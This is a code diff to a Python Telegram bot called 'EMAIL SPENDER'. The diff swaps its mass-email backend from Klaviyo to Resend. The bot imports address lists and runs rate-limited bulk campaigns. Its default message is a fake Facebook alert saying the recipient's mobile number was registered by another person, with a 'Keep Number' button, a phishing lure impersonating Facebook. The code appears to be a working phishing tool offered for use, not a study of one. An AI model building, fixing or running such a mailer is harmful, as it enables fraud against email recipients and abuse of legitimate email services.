@@ -28,7 +28,7 @@ STATE_FILE = BASE_DIR / "state.json"
 LOG_FILE = BASE_DIR / "campaign_log.json"
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
-KLAVIYO_API_KEY = os.getenv("KLAVIYO_API_KEY", "").strip()   # ← replaced BREVO_API_KEY
+RESEND_API_KEY = os.getenv("RESEND_API_KEY", "").strip()   # ← Resend API key
 SENDER_NAME = os.getenv("SENDER_NAME", "My Company").strip()
 SENDER_EMAIL = os.getenv("SENDER_EMAIL", "").strip()
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "").strip()
@@ -47,9 +47,9 @@ EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")
 
 DEFAULT_BODY = """Hi there,
 
-We wanted to let you know that your mobile number was verified and registered by another person on My Facebook.
+We wanted to let you know that your mobile number was verified and registered by another person on Facebook.
 
-This mobile number is still associated with your account. If you're still receiving SMS notifications from My Facebook, the person who just confirmed may also see future Facebook SMS notifications sent to this number.
+This mobile number is still associated with your account. If you're still receiving SMS notifications from facebook, the person who just confirmed may also see future My Company SMS notifications sent to this number.
 
 If you'd like to continue to keep this number on your account, click the Keep Number button.
 
@@ -267,37 +267,24 @@ def build_email_html(body: str, button1_text: str, button1_link: str,
 </html>"""
 
 # ---------------------------------------------------------------------------
-# Klaviyo transactional send  (replaces send_brevo_email)
+# Resend transactional send
 # ---------------------------------------------------------------------------
 
-def send_klaviyo_email(to_email: str, subject: str, html_content: str) -> requests.Response:
+def send_resend_email(to_email: str, subject: str, html_content: str) -> requests.Response:
     """
-    Send a single transactional email via Klaviyo's Send Email API.
-    Docs: https://developers.klaviyo.com/en/reference/send_email
-    Requires a Klaviyo account with transactional email enabled.
+    Send a single email via Resend API.
+    Docs: https://resend.com/docs/api-reference/emails/send-email
     """
-    url = "https://a.klaviyo.com/api/emails/"
+    url = "https://api.resend.com/emails"
     headers = {
-        "accept": "application/json",
-        "revision": "2024-02-15",          # pin to a stable API revision
-        "content-type": "application/json",
-        "Authorization": f"Klaviyo-API-Key {KLAVIYO_API_KEY}",
+        "Authorization": f"Bearer {RESEND_API_KEY}",
+        "Content-Type": "application/json",
     }
     payload = {
-        "data": {
-            "type": "email",
-            "attributes": {
-                "from_email": SENDER_EMAIL,
-                "from_label": SENDER_NAME,
-                "subject": subject,
-                "body": {
-                    "html": html_content,
-                },
-                "to": [
-                    {"email": to_email}
-                ],
-            }
-        }
+        "from": f"{SENDER_NAME} <{SENDER_EMAIL}>",
+        "to": [to_email],
+        "subject": subject,
+        "html": html_content,
     }
     return requests.post(url, json=payload, headers=headers, timeout=30)
 
@@ -310,7 +297,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id if update.effective_chat else "unknown"
     text = (
         "✨ *EMAIL SPENDER* ✨\n"
-        "_Elite Email Campaign Manager — Klaviyo Edition_\n\n"
+        "_Elite Email Campaign Manager — Resend Edition_\n\n"
         f"🆔 *Chat ID:* `{chat_id}`\n\n"
         "📋 *CAMPAIGN SETUP*\n"
         "┣ /addemails — Import email list\n"
@@ -330,7 +317,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "┣ /resume — Resume campaign\n"
         "┣ /status — Live statistics\n"
         "┗ /clearemails — Reset email list\n\n"
-        "💎 _Powered by Klaviyo_"
+        "💎 _Powered by Resend_"
     )
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
 
@@ -503,7 +490,7 @@ async def testsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
         state["button2_link"]
     )
     try:
-        resp = send_klaviyo_email(test_email, state["subject"], html_content)
+        resp = send_resend_email(test_email, state["subject"], html_content)
         if 200 <= resp.status_code < 300:
             await update.message.reply_text(f"✅ Test email sent to {test_email}")
         else:
@@ -514,7 +501,7 @@ async def testsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Error: {e}")
 
 # ---------------------------------------------------------------------------
-# Campaign runner (Klaviyo + hourly rate limiting)
+# Campaign runner (Resend + hourly rate limiting)
 # ---------------------------------------------------------------------------
 
 async def campaign_runner(app, chat_id: int):
@@ -648,7 +635,7 @@ async def campaign_runner(app, chat_id: int):
                     )
 
                 try:
-                    resp = send_klaviyo_email(email, state["subject"], html_content)
+                    resp = send_resend_email(email, state["subject"], html_content)
                     if 200 <= resp.status_code < 300:
                         sent_this_run += 1
                         batch_sent += 1
@@ -758,7 +745,7 @@ async def campaign_runner(app, chat_id: int):
 @require_admin
 async def sendcampaign(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = load_state()
-    if not KLAVIYO_API_KEY or not BOT_TOKEN or not SENDER_EMAIL:
+    if not RESEND_API_KEY or not BOT_TOKEN or not SENDER_EMAIL:
         await update.message.reply_text("❌ Missing environment variables.")
         return
     if state.get("campaign_task_running"):
@@ -827,8 +814,8 @@ def validate_startup():
     missing = []
     if not BOT_TOKEN:
         missing.append("BOT_TOKEN")
-    if not KLAVIYO_API_KEY:
-        missing.append("KLAVIYO_API_KEY")
+    if not RESEND_API_KEY:
+        missing.append("RESEND_API_KEY")
     if not SENDER_EMAIL:
         missing.append("SENDER_EMAIL")
     if missing:
@@ -853,7 +840,7 @@ def main():
     app.add_handler(CommandHandler("status", status))
     app.add_handler(CommandHandler("sethourlylimit", sethourlylimit))    # NEW
     app.add_handler(CommandHandler("ratelimitstatus", ratelimitstatus))  # NEW
-    logging.info("Bot started (Klaviyo edition)")
+    logging.info("Bot started (Resend edition)")
     app.run_polling()
 
 if __name__ == "__main__":
